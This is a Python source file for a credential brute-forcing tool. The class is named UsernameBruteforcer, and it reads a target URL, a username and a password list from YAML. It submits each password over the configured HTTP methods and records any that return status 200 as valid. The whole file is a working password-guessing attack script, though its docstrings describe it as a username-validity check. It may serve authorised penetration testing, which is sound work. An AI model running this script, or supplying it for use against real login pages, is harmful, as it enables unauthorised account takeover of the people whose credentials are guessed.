import requests
import json
import yaml

class UsernameBruteforcer():

    """"
    Class that takes input from
    a YAML file and then attempts to
    ascertain if a user account is
    valid on target application
    """
    valid_users = {}
    invalid_users = {}
    yamldump = {}
    user_field = ""
    data = {}
    url = ""


    def __init__(self, yaml_config):
        """
        Kick off the application
        """
        self.load_yaml(yaml_config)
        self.load_params()
        self.dump_yaml_output()


    def load_yaml(self, yaml_config):
        """"
        Load params from
        a YAML document
        """
        opendoc = open(yaml_config, "r")
        self.yamldump = yaml.load_all(opendoc, Loader=yaml.FullLoader)


    def load_params(self):
        """
        Load parameters
        from yamldump
        """
        for key in self.yamldump:

            self.data = {}
            self.user = key['user']
            self.user_field = key['user_field']
            self.password_field = key['password_field']
            self.url = key['url']
            self.data[self.user_field] = ""
            try:
                self.methods = [m.lower().strip() for m in key['methods']]
            except KeyError:
                raise ValueError('Missing "methods" list')
            if key['data'] and key['data'] != None:
                data_vals = key['data']
                for k in data_vals:
                    self.data[k] = data_vals[k]
            try:
                for m in self.methods:
                    self.check_for_valid_users(key['passwords'], m)
            except KeyError:
                raise ValueError('Missing "passwords" list')


    def check_for_valid_users(self, passwords_list, method):
        """
        Using input parameters
        test target url/api
        to see if user exists
        """
        self.valid_users[method] = {'users': []}
        self.invalid_users[method] = {'users': []}
        for password in passwords_list:
            self.data[self.user_field] = self.user
            self.data[self.password_field] = password
            requestMethod = getattr(requests, method, None)
            if requestMethod is None:
                raise ValueError('Method "{method}" is not supported'.format(
                    method=repr(method)))
            data_key = 'params' if method == 'get' else 'data'
            req_params = {'url': self.url,
                          data_key: self.data}
            r = requestMethod(**req_params)

            if str(r.status_code) == "200":
                print ("\nMethod is: " + method.upper())
                print ("Status code is: " + str(r.status_code))
                print ("Response message is: " + str(r.reason))
                print ("Valid user: " + self.user)
                print ("Valid password: " + str(password))
                self.valid_users[method]['users'].append(password)
            else:
                print ("Status code is: " + str(r.status_code))
                print ("Invalid password: " + str(password))
                self.invalid_users[method]['users'].append(password)


    def dump_yaml_output(self):
        """
        Dump a lsit of valid and
        invalid users to two separate
        docs
        """
        valid_users_doc = open('valid_users.yaml', 'w')
        yaml.dump(self.valid_users, valid_users_doc, default_flow_style=False)
        invalid_users_doc = open('invalid_users.yaml', 'w')
        yaml.dump(self.invalid_users, invalid_users_doc,
                  default_flow_style=False)